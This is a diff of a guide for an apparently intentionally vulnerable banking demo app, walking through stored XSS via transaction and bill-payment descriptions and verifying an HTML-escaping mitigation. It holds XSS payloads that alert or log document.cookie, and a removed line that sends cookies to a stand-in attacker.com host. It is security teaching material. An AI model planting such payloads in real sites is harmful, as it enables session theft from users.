@@ -12,6 +12,16 @@ XSS allows attackers to inject malicious scripts into web pages viewed by other 
 
 Use the global **Toggle Mitigation** button on the app's homepage to switch between Vulnerable (protections off) and Hardened (protections on) states. For the exploit steps, ensure the toggle is set to **Vulnerable**. For mitigation verification, set it to **Hardened**—no env changes or restarts needed.
 
+**Important — Token Expiration in Hardened Mode:** When the toggle is set to Hardened, JWT tokens expire after **5 seconds** by default, which is too short to complete any test. Before testing mitigations, increase the expiration in `mitigations/session_exp.py` at **line 10**. Change:
+```python
+'exp': datetime.utcnow() + timedelta(seconds=5)
+```
+to a longer duration, for example:
+```python
+'exp': datetime.utcnow() + timedelta(minutes=10)
+```
+After making this change, restart the application. You must also **log out and log back in** after toggling to Hardened mode so your new token is signed with the updated secret.
+
 ## Demonstrations
 
 ### Transaction Description XSS
@@ -31,39 +41,25 @@ Allows injection of malicious scripts through transaction descriptions.
      <img src=x onerror="alert('XSS Vulnerability!')">
      ```
 5. Click "Transfer" button to submit the transaction
-6. Navigate to "Transaction History" section on your dashboard
-7. Observe the alert popup appears immediately when the page renders
+6. Navigate to "Transaction History" section on your dashboard (or refresh the page)
+7. Observe the alert popup appears when the transaction history renders
 
-**Expected Result (Vulnerable):** Alert popup displays "XSS Vulnerability!" demonstrating arbitrary JavaScript execution. The script executes every time the transaction history is viewed.
+**Expected Result (Vulnerable):** Alert popup displays "XSS Vulnerability!" demonstrating arbitrary JavaScript execution. The script executes each time the transaction history is rendered (including immediately after the transfer completes).
 
-**Advanced Test**: Replace the payload with a cookie stealer to demonstrate data exfiltration:
-```
-<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
-```
-(Note: This will fail in a real scenario but demonstrates the attack vector)
+#### Mitigate
 
-**Protected Behavior (Mitigation On):** With **Toggle Mitigation** set to Hardened, the payload is rendered as plain text: `<img src=x onerror="alert('XSS Vulnerability!')">` with no script execution. The HTML is escaped and displayed literally.
+1. Click **Toggle Mitigation** to switch to **Hardened** mode (protections on)
+2. Log out and log back in (to get a new token signed with the updated secret)
+3. Repeat the exploit steps (send a new transfer with the same XSS payload in the description)
+4. Navigate to "Transaction History" section
+
+**Expected Result (Protected):** The payload is rendered as plain text: `<img src=x onerror="alert('XSS Vulnerability!')">` with no script execution. The HTML is escaped and displayed literally.
 
 ### Bill Payment XSS
 
-Allows injection through bill payment categories and biller names. This demonstrates stored XSS that affects all users viewing payment options.
+Allows injection of malicious scripts through bill payment descriptions. This demonstrates stored XSS that executes when payment history is viewed.
 
 #### Exploit
-
-##### Method 1: Via Browser Console (Direct Database Injection Simulation)
-
-1. Log in to your account
-2. Open browser developer tools (F12)
-3. Go to Console tab
-4. Execute the following command to view current bill categories:
-   ```javascript
-   fetch('/api/bill-categories', {
-       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('jwt_token') }
-   }).then(r => r.json()).then(console.log);
-   ```
-5. Note: In a real attack scenario, an attacker with database access could inject XSS into category/biller names
-
-##### Method 2: Via Payment Description (User Input)
 
 1. Confirm the app is in **Vulnerable** mode (Toggle Mitigation should indicate protections are off)
 2. Log in and navigate to "Bill Payments" section
@@ -85,22 +81,9 @@ Allows injection through bill payment categories and biller names. This demonstr
 
 #### Mitigate
 
-1. Return to the homepage and click **Toggle Mitigation** to switch to **Hardened** mode (protections on)
-2. Repeat exploit steps (create a new payment with XSS payload in description)
-3. View payment history and check browser console
+1. Click **Toggle Mitigation** to switch to **Hardened** mode (protections on)
+2. Log out and log back in (to get a new token signed with the updated secret)
+3. Repeat exploit steps (create a new payment with XSS payload in description)
+4. View payment history and check browser console
 
-**Expected Result (Protected):** HTML is escaped and displayed as plain text. Browser console shows no XSS execution. The payload appears as literal text: `<img src=x onerror="console.log('XSS in payment:',document.cookie)">`
-
-## Technical Details
-
-**Vulnerable Code:** Uses `innerHTML` without escaping user input
-**Hardened Code:** Uses `escapeHTML()` function to escape HTML entities before rendering
-
-The `escapeHTML()` function in `static/dashboard.js`:
-- When `XSS_PROTECTION_ENABLED=false`: Returns raw string (vulnerable)
-- When `XSS_PROTECTION_ENABLED=true`: Converts `<` to `&lt;`, `>` to `&gt;`, etc.
-
-Affected files:
-- `static/dashboard.js`: Frontend rendering logic with escapeHTML() wrapper
-- Transaction history descriptions
-- Bill payment category and biller names
+**Expected Result (Protected):** Browser console shows no XSS execution. The payload appears as literal text in the description of the bill payment: `<img src=x onerror="console.log('XSS in payment:',document.cookie)">`
